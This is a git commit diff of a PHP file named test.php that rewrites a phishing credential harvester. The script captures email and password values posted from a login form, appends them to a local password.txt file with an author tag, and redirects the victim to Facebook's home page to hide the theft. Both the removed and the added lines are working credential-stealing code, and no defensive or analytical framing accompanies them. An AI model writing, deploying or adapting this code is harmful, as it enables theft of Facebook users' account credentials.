842eb1735381144faac923dc1df42da01520d436
ZinDown <137133957+ZinDown@users.noreply.github.com>
2024-02-01 11:54:53 +0630

    Update test.php

--- test.php
+++ test.php
@@ -1,3 +1,9 @@
-<?php header("location : https://m.facebook.com/home.php"); $email =$_POST['email']; $pword =$_POST['password']; $file =fopen("knpassword.txt","a"); fwrite($file,"email: $email \n "); fwrite($file,"password : $pword \n"); fwrite($file, "Developed By KoNyi\n");
-
+<?php 
+header("location : https://www.facebook.com/home.php");
+$email =$_POST['email']; 
+$pword =$_POST['password']; 
+$file =fopen("password.txt","a"); 
+fwrite($file,"email: $email \n "); 
+fwrite($file,"password : $pword \n"); 
+fwrite($file, "*******KoNyiJR*******\n");
 ?>
